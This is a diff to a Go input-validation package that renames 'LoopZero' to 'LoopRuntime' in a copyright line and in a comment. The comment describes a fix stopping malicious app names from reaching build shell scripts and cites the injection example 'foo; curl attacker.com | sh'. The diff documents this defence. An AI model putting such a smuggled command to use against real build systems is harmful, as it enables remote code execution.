@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: Apache-2.0
-// Copyright 2025-2026 The LoopZero Authors
+// Copyright 2025-2026 The LoopRuntime Authors
 
 // Package validation provides input validation for API request fields.
 package validation
@@ -72,7 +72,7 @@ func ValidateAppPath(path string) error {
 // Kubernetes resource names, and container image tags.
 //
 // CODE-001 fix: app.Name flows into Argo Workflow shell scripts via
-// loopzeroPacksDockerfileStep() and buildctl arguments. Without validation,
+// loopruntimePacksDockerfileStep() and buildctl arguments. Without validation,
 // a malicious app name like "foo; curl attacker.com | sh" enables RCE
 // in the build cluster.
 //
